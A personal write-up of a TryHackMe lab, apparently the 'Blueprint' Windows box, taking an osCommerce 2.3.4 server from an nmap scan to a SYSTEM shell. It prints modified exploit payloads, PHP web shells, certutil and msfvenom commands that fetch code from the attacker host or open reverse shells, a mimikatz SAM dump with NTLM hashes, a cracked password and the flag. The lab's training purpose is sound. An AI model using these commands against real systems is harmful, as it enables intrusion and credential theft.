### nmap

```
   │   ~/Desktop/THM/mustacchio ▓▒░ nmap -p80,135,139,443,445,3306,8080,49153,49159,49160 -sV -sT -A 10.10.220.55 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-02 21:31 IST
Nmap scan report for 10.10.220.55
Host is up (0.18s latency).

PORT      STATE  SERVICE      VERSION
80/tcp    open   http         Microsoft IIS httpd 7.5
|_http-title: 404 - File or directory not found.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
135/tcp open  msrpc   Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open   ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| tls-alpn: 
|_  http/1.1
|_http-title: Bad request!
445/tcp   open   microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open   mysql        MariaDB (unauthorized)
8080/tcp  open   http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| http-methods: 
|_  Potentially risky methods: TRACE
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
49153/tcp open   msrpc        Microsoft Windows RPC
49159/tcp open   msrpc        Microsoft Windows RPC
49160/tcp open   msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02c328ed1579 (unknown)
|_clock-skew: mean: -5h50m15s, deviation: 34m37s, median: -5h30m16s
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-10-02T11:32:14+01:00
| smb2-time: 
|   date: 2023-10-02T10:32:15
|_  start_date: 2023-10-02T10:21:15
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.19 seconds
```


### HTTP 8080

- found multiple files at http://10.10.220.55:8080/oscommerce-2.3.4/docs/
- "osCommerce Online Merchant v2.3.4" is installed

- following this exploit
https://www.exploit-db.com/exploits/44374


http://10.10.220.55:8080/oscommerce-2.3.4/catalog/install/


10.10.220.55:8080

this exploit was not successfull


### Foothold

- Using a different writeup

- created a php RCE shell 
```
   │   ~/Desktop/THM/blueprint ▓▒░ cat shell.php                                                                             ░▒▓ ✔ │ 22:32:17   
 
<?php passthru($_GET['cmd']); ?>%
```

- made some changes in the 43191.py https://www.exploit-db.com/exploits/43191
(just put the brackets where it is giving error)

and change `import urlparse` to `from urllib.parse import urlparse`


- now running the exploit command

```
python3 43191.py -u http://10.10.220.55:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.php
```

we encounter an error

```
[-] The script wasn't able to authenticate itself to osCommerce. Are you sure that the credentials are correct? Is http://10.10.220.55:8080/oscommerce-2.3.4/catalog/admin/login.php the Admin Path?
```

so first i went to http://10.10.220.55:8080/oscommerce-2.3.4/catalog/admin/login.php and created a `admin:admin` login and then ran the command again and this was also not working

---
- used this writeup now https://cd6629.gitbook.io/pentest-research/windows-ctfs/blueprint-w

- used this exploit https://www.exploit-db.com/exploits/44374

- Made following chanages in the exploit 
```
base_url = "http://10.10.220.55:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.220.55:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"


payload = '\');'
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.17.24.189:8000/shell.php shell.php & nslookup test 10.17.24.189");'    # this is where you enter you PHP payload
payload += 'echo $var;'
payload += '/*'
```

- started my own python webserver 

- created a shell.php file with the contents
```
   │   ~/Desktop/THM/blueprint ▓▒░ cat shell.php                                                              
<?php echo shell_exec($_GET["cmd"]); ?>
```

- now running the exploit
```
sudo python3 44374.py                                                            ░▒▓ ✔ │ 36s   │ 23:05:49   
[+] Successfully launched the exploit. Open the following URL to execute your code

http://10.10.220.55:8080/oscommerce-2.3.4/catalog/install/includes/configure.php
```

- now we have to go to http://10.10.220.55:8080/oscommerce-2.3.4/catalog/install/includes select the shell.php file and change the url to http://10.10.220.55:8080/oscommerce-2.3.4/catalog/install/includes/shell.php?cmd=whoami

we get `nt authority\system` this means the exploit has worked success fully


- now created a windows reverse shell exe file using
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#windows-stageless-reverse-tcp


and ran this command 

```
[msf](Jobs:0 Agents:0) >> msfvenom -p windows/shell_reverse_tcp LHOST=10.17.24.189 LPORT=4444 -f exe > reverse.exe
```


- now followed the above steps again but now install of `shell.php` i will download the `reverse.exe`

`http://10.17.24.189:8000/reverse.exe reverse.exe`

- now success fully uplaoded the reverse.exe file and now going back to http://10.10.220.55:8080/oscommerce-2.3.4/catalog/install/includes/shell.php?cmd=dir

we change the command to `reverse.exe` and start a netcat (port 4444) listener for it

- this http://10.10.220.55:8080/oscommerce-2.3.4/catalog/install/includes/shell.php?cmd=reverse.exe also did not work for me

---

- now found this resource https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php

- using the above method to deliver this file


- change `system` to `shell_exec` in the windows php reverse shell
`$output = shell_exec($cmd);`
 started nc listener , triggered the file and got a shell


```
C:\Windows\Temp>whoami
whoami
nt authority\system

```

- and found the root flag

```
C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```



- now to get the   
"Lab" user NTLM hash decrypted

using the writeup we get

---
For this, we will use **Mimikatz** it's **a leading post-exploitation tool that dumps passwords from memory and** **hashes**, **PINs**, and Kerberos tickets.

The Big Question Here is that How to get Mimikatz on the server as we don't have services like Netcat and Curl To Download Files?.

So for this, we will use **Certutil.exe** this is **a command-line program**, installed as part of Certificate Services. We can use this to Fetch File From Other Servers

We will first get the x86 Version of Mimikatz in our Current Directory and then start a simple python HTTP server. And then Setup certutil.exe on the target machine to fetch Our Hosted File. Launch Certutil using the following command.

---

- copied the minikatz file in current directory using
```
~/Desktop/THM/blueprint ▓▒░ cp /usr/share/mimikatz/Win32/mimikatz.exe .
```
and
`python3 -m http.server`

- now using the certutil command syntax

```
certutil.exe -urlcache -f http://YOUR_IP:8000/mimikatz.exe mimi.exe
```


for us it will be


```
certutil.exe -urlcache -f http://10.17.24.189:8000/mimikatz.exe mimi.exe
```



- we then run the file `C:\Windows\Temp>mimi.exe`
followed with `mimikatz # lsadump::sam`
```
mimikatz # lsadump::sam
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 549a1bcb88e35dc18c7a0b0168631411

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 30e87bf999828446a1c1209ddde4c450
```


- able to crack the hash at https://hashes.com/en/decrypt/hash
`30e87bf999828446a1c1209ddde4c450:googleplus`








